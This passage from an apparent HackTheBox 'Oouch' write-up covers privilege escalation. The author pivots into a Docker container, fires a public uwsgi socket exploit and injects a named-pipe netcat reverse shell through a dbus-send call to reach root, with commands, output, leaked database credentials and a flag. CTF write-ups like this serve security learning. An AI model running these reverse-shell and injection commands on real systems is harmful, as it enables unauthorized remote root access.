       valid_lft forever preferred_lft forever
    inet6 fe80::42:61ff:fe5e:2bbf/64 scope link
       valid_lft forever preferred_lft forever
```

The answer was yes! After connecting through ssh with the same key for user `qtc`, I began enumerating the docker container. It took a few tries to find an IP I could connect to \(`172.18.0.5`\).

> _Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was `172.178.0.4` the next time I did it._

```bash
qtc@oouch:~/.ssh$ ssh qtc@172.18.0.5 -i id_rsa 
The authenticity of host '172.18.0.5 (172.18.0.5)' can't be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.5' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaiHaXNdUzLxnlmEI1y+DWRQjEELNA+GcK1vEQXmAFYm9f6GubbWvdkt6QkgvWTvh7FnLM5U4sdfKPFv6mNZZwHZ9nNxB4gR+5B5EGOIzX+D+uDmdbe3r+ME8E68t1aUcwLEba6xF+PErQuiEBCdgcH405dYMClu/apccO+ougD+QpWOFhHNE9VOWHZD3++oRNJFS/Zgh8IZOLU0PnnenLC8ZK3CritRchzG0QHKxgV/6tMPmmzIKk0Ak7iixaK8hzrtKfPNCI3QPe8kXG1KYnMoo8mZ6c3CDUWevldAK+m1i7rluORNRwn6r4KAGwdP2qUdtMR2uo7COl2t5uGtuYtBRrhAZe/S637f/VMrrPq8+2B7db+ne1qn4WyD/sPxf4rfZDwlvXJ6ctfKMYUrV69eMtIKaiU3FYGqXTfAaObmFrO0++TvB/ZcH4h21edVPCn2HJ4pHUFZaYDEUKd2Ho61N0cgGUYWWc+mcCoCxyLLSaOJAv2vtjErV9YkyLGWM= pentester@kali

qtc@aeb4525789d8:/$ ls 
bin   code  etc   lib    media  opt   root  sbin  sys  usr
boot  dev   home  lib64  mnt    proc  run   srv   tmp  var
qtc@aeb4525789d8:/$ ls -la
total 84
drwxr-xr-x   1 root root 4096 Feb 25 12:33 .
drwxr-xr-x   1 root root 4096 Feb 25 12:33 ..
-rwxr-xr-x   1 root root    0 Feb 25 12:33 .dockerenv
drwxr-xr-x   1 root root 4096 Feb 11 17:37 bin
drwxr-xr-x   2 root root 4096 Nov 10  2019 boot
drwxr-xr-x   4 root root 4096 Feb 11 17:34 code
drwxr-xr-x   5 root root  340 Jun 11 04:35 dev
drwxr-xr-x   1 root root 4096 Feb 25 12:33 etc
drwxr-xr-x   1 root root 4096 Feb 11 17:37 home
drwxr-xr-x   1 root root 4096 Feb 11 17:37 lib
drwxr-xr-x   2 root root 4096 Jan 30 00:00 lib64
drwxr-xr-x   2 root root 4096 Jan 30 00:00 media
drwxr-xr-x   2 root root 4096 Jan 30 00:00 mnt
drwxr-xr-x   2 root root 4096 Jan 30 00:00 opt
dr-xr-xr-x 215 root root    0 Jun 11 04:35 proc
drwx------   1 root root 4096 Feb 11 17:38 root
drwxr-xr-x   1 root root 4096 Jun 11 10:23 run
drwxr-xr-x   1 root root 4096 Feb 11 17:37 sbin
drwxr-xr-x   2 root root 4096 Jan 30 00:00 srv
dr-xr-xr-x  13 root root    0 Jun 11 04:35 sys
drwxrwxrwt   1 root root 4096 Jun 11 04:35 tmp
drwxr-xr-x   1 root root 4096 Jan 30 00:00 usr
drwxr-xr-x   1 root root 4096 Feb 11 17:36 var
```

The `/code` folder looked interesting...

```text
qtc@aeb4525789d8:/$ cd code
qtc@aeb4525789d8:/code$ ls -la
total 52
drwxr-xr-x 4 root root 4096 Feb 11 17:34 .
drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
-rw-r--r-- 1 root root 1072 Feb 11 17:34 Dockerfile
-r-------- 1 root root  568 Feb 11 17:34 authorized_keys
-rw-r--r-- 1 root root  325 Feb 11 17:34 config.py
-rw-r--r-- 1 root root   23 Feb 11 17:34 consumer.py
-r-------- 1 root root 2602 Feb 11 17:34 key
drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
-rw-r--r-- 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
-rw-r--r-- 1 root root  241 Feb 11 17:34 requirements.txt
-rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
-rw-rw-rw- 1 root root    0 Jun 11 10:36 urls.txt
-rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
qtc@aeb4525789d8:/code$
qtc@aeb4525789d8:/code$ cat requirements.txt 
Flask==1.0.2
Flask-Bootstrap==3.3.7.1
Flask-Login==0.4.1
Flask-Migrate==2.5.2
Flask-SQLAlchemy==2.4.0
Flask-WTF==0.14.2
uWSGI==2.0.17.1
Werkzeug==0.14.1
requests==2.20.1
geojson==2.5.0
jsonschema==2.6.0
simplejson==3.16.0
mysqlclient==1.4.4
qtc@aeb4525789d8:/code$ cat config.py
```

```python
import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    # ...
    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
```

The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route or a rabbit hole. I never used it.

```bash
qtc@aeb4525789d8:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

The uwsgi service was running on `oouch`, and the `uwsgi.ini` file is in the docker. Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`. I checked to see if there are any exploits and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

I then tried to run the exploit to try to get a reverse shell:

```bash
zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://10.10.10.177:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
uwsgi.py: error: the following arguments are required: -u/--uwsgi
```

The uwsgi service runs from the docker container so I couldn't figure out how to run this exploit remotely. I then copied it to the container \(along with nc since it wasn't installed.\)

> _Note: make sure to put the `:` after the IP and before the folder name, it won't work otherwise._

```bash
qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa ./uwsgi.py qtc@172.18.0.5:/tmp/
uwsgi.py                                                             100% 4428     8.3MB/s   00:00
qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa /bin/nc qtc@172.18.0.5:/tmp/
nc                                                                   100%   27KB  24.7MB/s   00:00
```

`uwsgi.socket` was in `/tmp` so I had my `--uwsgi` argument taken care of, but then encountered an error while running the exploit:

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "nc -e /bin/sh 10.0.0.1 1234"
[*]Sending payload.
Traceback (most recent call last):
  File "./uwsgi.py", line 146, in <module>
    main()
  File "./uwsgi.py", line 143, in main
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
  File "./uwsgi.py", line 110, in curl
    return ask_uwsgi(addr_and_port, mode, var)
  File "./uwsgi.py", line 77, in ask_uwsgi
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
  File "./uwsgi.py", line 26, in pack_uwsgi_vars
    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
  File "./uwsgi.py", line 18, in sz
    if sys.version_info[0] == 3: import bytes
ModuleNotFoundError: No module named 'bytes'
```

Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran. I still wasn't able to get a shell back to my box from the docker container, so I tried sending it to the `oouch` box instead.

...it worked!

```bash
qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "/tmp/nc -e /bin/sh 172.18.0.1 1234"
[*]Sending payload.
```

And, I got a connection back on `qtc@oouch`.

```bash
qtc@oouch:/dev/shm$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 53934
whoami && hostname
www-data
aeb4525789d8
```

Now that I was `www-data`, I needed to see if that dbus config I found earlier could come in handy. It mentioned interacting with dbus and the `htb.oouch.block` app. The code below was from `routes.py` found in the `/code/oouch` directory of the docker container. It shows the information needed to craft our message to DBus.

_I also think this was the filter that was blocking my early XSS attempts on the `/contact` page._

```python
# First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```

I found some examples of how to craft the message at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There is also a related POC that exploits a kernel module \(which we didn't need to do for this, thankfully!\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).

The example POC code:

```bash
dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"

method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
```

My test code:

```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"echo whoami;"

method return time=1591881935.932055 sender=:1.2 -> destination=:1.1283 serial=7 reply_serial=2
   string "Carried out :D"
```

The reply `string "Carried out :D"` looks like I am the right track, though I didn't see any echo.

I then tried substituting the `echo whoami` command for a reverse shell:

> `dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"`

I still couldn't reach my home box from the container...but maybe I could send this shell to `qtc@oouch` again.

> _Note: It also needed `;` on the end for some reason!!_

### Getting a shell

My final working exploit:

```text
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1234 >/tmp/f;"

method return time=1591882762.569865 sender=:1.2 -> destination=:1.1325 serial=15 reply_serial=2
   string "Carried out :D"
```

I'm in!

### Root.txt

```bash
qtc@oouch:/etc/dbus-1/system.d$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [10.10.10.177] 50776
/bin/sh: 0: can't access tty; job control turned off
# whoami && hostname
root
oouch
# cat root.txt
d63a830d3105bfeb7bb05f994080f187
```

Thanks to [`qtc`](https://www.hackthebox.eu/home/users/profile/103578) for a very fun and very challenging box!

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

